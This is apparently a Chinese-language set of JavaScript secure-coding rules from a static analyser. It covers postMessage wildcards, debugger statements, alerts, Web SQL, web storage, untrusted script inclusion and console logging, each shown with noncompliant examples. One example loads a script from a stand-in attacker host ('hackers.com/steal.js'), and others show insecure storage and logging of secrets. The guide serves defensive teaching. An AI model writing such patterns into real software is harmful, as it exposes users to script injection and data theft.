## 应谨慎限制跨文档消息传递域

HTML5增加了向其他域提供的文档发送消息的功能。根据规格：

> 作者不应在包含任何机密信息的邮件中的targetOrigin参数中使用通配符关键字（*），否则无法保证邮件仅传递给其预期的收件人。

为了降低将敏感信息发送到从恶意或未知域提供的文档的风险，每次使用Window.postMessage时，此规则都会引发问题。

**不合规的代码示例**
```
var myWindow = document.getElementById('myIFrame').contentWindow;
myWindow.postMessage(message, "*"); // 不合规; how do you know what you loaded in 'myIFrame' is still there?
```

**参考**
  * OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS)


## 不应使用调试器语句

调试器语句可以放在过程中的任何位置以暂停执行。使用调试器语句类似于在代码中设置断点。根据定义，必须绝对从源代码中删除此类语句，以防止任何意外行为或增加生产中的攻击漏洞。

**不合规的代码示例**
```
for (i = 1; i<5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
  // Wait for user to resume.
  debugger;
}
```

**合规解决方案**
```
for (i = 1; i<5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
}
```

**参考**
  * [MITRE, CWE-489](http://cwe.mitre.org/data/definitions/489.html) - Leftover Debug Code
  * OWASP Top 10 2017 Category A3 - Sensitive Data Exposure


## 不应使用 alert(...)

alert(...)以及confirm(...)和prompt(...)对于开发期间的调试很有用，但在生产模式下，这种弹出窗口可能会将敏感信息暴露给攻击者，并且永远不应该显示。

**不合规的代码示例**
```
if(unexpectedCondition) {
  alert("Unexpected Condition");
}
```

**参考**
  * [MITRE, CWE-489](http://cwe.mitre.org/data/definitions/489.html) - Leftover Debug Code
  * OWASP Top 10 2017 Category A3 - Sensitive Data Exposure


## 不应使用Web SQL数据库

Web SQL数据库标准从未见过光明。它首先制定，然后由W3C弃用，并且仅在某些浏览器中实现。（Firefox或IE不支持。）

此外，使用Web SQL数据库会引起安全问题，因为您只需要其名称即可访问此类数据库。

**不合规的代码示例**
```
var db = window.openDatabase("myDb", "1.0", "Personal secrets stored here", 2*1024*1024);  // 不合规
```


## 不应使用本地存储

会话存储和本地存储是HTML 5的功能，允许开发人员轻松存储客户端的兆字节数据，而不是4Kb cookie可以容纳的数据。尽管在客户端加速应用程序非常有用，但以这种方式存储敏感信息可能会很危险，因为默认情况下数据未加密，并且页面上的任何脚本都可以访问它。

使用localStorage和sessionStorageAPI 时，此规则会引发问题。

**不合规的代码示例**
```
localStorage.setItem("login", login); // 不合规
sessionStorage.setItem("sessionId", sessionId); // 不合规
```

**参考**
  * OWASP Top 10 2017 Category A3 - Sensitive Data Exposure
  * [Packet Storm Security](https://dl.packetstormsecurity.net/papers/attack/HTML5AttackVectors_RafayBaloch_UPDATED.pdf) - HTML 5 Modern Day Attack And Defence Vectors


## 不应包含不受信任的内容

从不受信任的来源中包含您网站中的内容可能会将您的用户暴露给攻击者，甚至会破坏您自己的网站。因此，此规则会为每个非相对URL引发问题。

**不合规的代码示例**
```
function include(url) {
  var s = document.createElement("script");
  s.setAttribute("type", "text/javascript");
  s.setAttribute("src", url);
  document.body.appendChild(s);
}
include("http://hackers.com/steal.js")  // 不合规
```

**参考**
  * [MITRE, CWE-829](http://cwe.mitre.org/data/definitions/829) - Inclusion of Functionality from Untrusted Control Sphere
  * OWASP Top 10 2017 Category A1 - Injection
  * [SANS Top 25](https://www.sans.org/top25-software-errors/#cat2) - Risky Resource Management


## 不应使用控制台日志记录

调试语句在开发过程中始终有用。但是将它们包含在生产代码中 - 特别是在运行客户端的代码中 - 并且存在无意中暴露敏感信息，减慢浏览器速度，甚至为某些用户错误输出网站的风险。

```
console.log(password_entered); // 不合规
```

**参考**
  * OWASP Top 10 2017 Category A3 - Sensitive Data Exposure
